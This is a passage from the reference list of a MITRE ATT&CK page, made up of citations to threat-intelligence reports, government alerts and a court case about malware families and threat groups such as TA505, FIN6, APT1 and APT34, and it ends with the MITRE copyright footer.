and Proofpoint Staff. (2019, January 9). ServHelper and FlawedGrace - New malware introduced by TA505. Retrieved May 28, 2019. Fidelis Cybersecurity. (2013, June 28). Fidelis Threat Advisory #1009: ""njRAT"" Uncovered. Retrieved June 4, 2019. Matveeva, V. (2017, August 15). Secrets of Cobalt. Retrieved October 10, 2018. valsmith. (2012, September 21). More on APTSim. Retrieved September 28, 2017. FireEye Labs. (2014, May 20). The PLA and the 8:00am-5:00pm Work Day: FireEye Confirms DOJ\xe2\x80\x99s Findings on APT1 Intrusion Activity. Retrieved November 4, 2014. FireEye Threat Intelligence. (2016, April). Follow the Money: Dissecting the Operations of the Cyber Crime Group FIN6. Retrieved June 1, 2016. McKeague, B. et al. (2019, April 5). Pick-Six: Intercepting a FIN6 Intrusion, an Actor Recently Tied to Ryuk and LockerGoga Ransomware. Retrieved April 17, 2019. Novetta Threat Research Group. (2016, February 24). Operation Blockbuster: Unraveling the Long Thread of the Sony Attack. Retrieved February 25, 2016. Novetta Threat Research Group. (2016, February 24). Operation Blockbuster: Remote Administration Tools & Content Staging Malware Report. Retrieved March 16, 2016. Unit 42. (2017, December 15). Unit 42 Playbook Viewer. Retrieved December 20, 2017. Davis, S. and Caban, D. (2017, December 19). APT34 - New Targeted Attack in the Middle East. Retrieved December 20, 2017. Elovitz, S. & Ahl, I. (2016, August 18). Know Your Enemy: New Financially-Motivated & Spear-Phishing Group. Retrieved February 26, 2018. PwC and BAE Systems. (2017, April). Operation Cloud Hopper. Retrieved April 5, 2017. United States District Court Southern District of New York (USDC SDNY) . (2018, December 17). United States of America v. Zhu Hua and Zhang Shilong. Retrieved April 17, 2019. US-CERT. (2018, March 16). Alert (TA18-074A): Russian Government Cyber Activity Targeting Energy and Other Critical Infrastructure Sectors. Retrieved June 6, 2018. US-CERT. (2017, October 20). Alert (TA17-293A): Advanced Persistent Threat Activity Targeting Energy and Other Critical Infrastructure Sectors. Retrieved November 2, 2017. FireEye iSIGHT Intelligence. (2017, June 16). FIN10: Anatomy of a Cyber Extortion Operation. Retrieved June 25, 2017. Cymmetria. (2016). Unveiling Patchwork - The Copy-Paste APT. Retrieved August 3, 2016. Novetta. (n.d.). Operation SMN: Axiom Threat Actor Group Report. Retrieved November 12, 2014. ASERT team. (2018, December 5). STOLEN PENCIL Campaign Targets Academia. Retrieved February 5, 2019. Hawley et al. (2019, January 29). APT39: An Iranian Cyber Espionage Group Focused on Personal Information. Retrieved February 19, 2019. Plan, F., et all. (2019, March 4). APT40: Examining a China-Nexus Espionage Actor. Retrieved March 18, 2019. Miller, S, et al. (2019, April 10). TRITON Actor TTP Profile, Custom Attack Tools, Detections, and ATT&CK Mapping. Retrieved April 16, 2019. Copyright \xc2\xa9 2015-2019, The MITRE Corporation. MITRE ATT&CK and ATT&CK are trademarks of The MITRE Corporation. Privacy Policy Terms of Use @MITREattack Contact
